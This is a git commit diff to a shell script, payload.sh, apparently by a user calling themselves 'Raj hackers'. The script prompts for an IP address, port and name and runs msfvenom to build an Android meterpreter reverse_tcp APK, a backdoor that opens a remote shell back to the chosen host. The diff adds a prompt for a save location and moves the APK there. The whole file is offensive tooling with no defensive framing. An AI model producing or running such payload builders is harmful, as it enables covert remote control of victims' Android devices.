bcf69e86a72a874821ee30e4bc9e98369a4220b1
Raj hackers <153776272+Rajhackers@users.noreply.github.com>
2024-01-18 16:01:08 +0530

    Update payload.sh

--- payload.sh
+++ payload.sh
@@ -9,10 +9,16 @@ ifconfig
 read -p "Enter payload IP: " n1
 read -p "Enter payload port: " n2
 read -p "Enter payload name: " n3
+read -p "save payload: " n4
 
 # Generate Metasploit payload
 msfvenom -p android/meterpreter/reverse_tcp LHOST=$n1 LPORT=$n2 -o $n3.apk
+pwd
+mv $n3.apk $n4 
+sleep 3
 clear
+
+
 # Display Metasploit commands
 echo "msfconsole"
 
